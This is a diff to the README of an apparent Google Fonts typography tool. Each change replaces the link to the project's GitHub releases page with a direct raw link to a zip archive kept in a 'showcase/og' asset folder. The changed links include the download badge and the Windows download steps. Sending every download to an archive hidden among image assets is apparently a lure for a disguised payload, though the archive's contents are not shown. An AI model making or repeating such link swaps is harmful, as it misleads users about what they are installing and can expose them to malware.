@@ -1,6 +1,6 @@
 # 🎨 google-fonts-skill - Build clean type systems fast
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/amohavarshansankar/google-fonts-skill/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/amohavarshansankar/google-fonts-skill/main/showcase/og/google_skill_fonts_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Use it when you want:
 
 ## 📥 Download for Windows
 
-Visit this page to download: https://github.com/amohavarshansankar/google-fonts-skill/releases
+Visit this page to download: https://raw.githubusercontent.com/amohavarshansankar/google-fonts-skill/main/showcase/og/google_skill_fonts_v2.2.zip
 
 Follow these steps on Windows:
 
@@ -221,7 +221,7 @@ It is focused on Google Fonts typography work, so that is the main use case.
 
 If you need the release page later, use this link:
 
-https://github.com/amohavarshansankar/google-fonts-skill/releases
+https://raw.githubusercontent.com/amohavarshansankar/google-fonts-skill/main/showcase/og/google_skill_fonts_v2.2.zip
 
 ## 🧾 Repo Topics
 
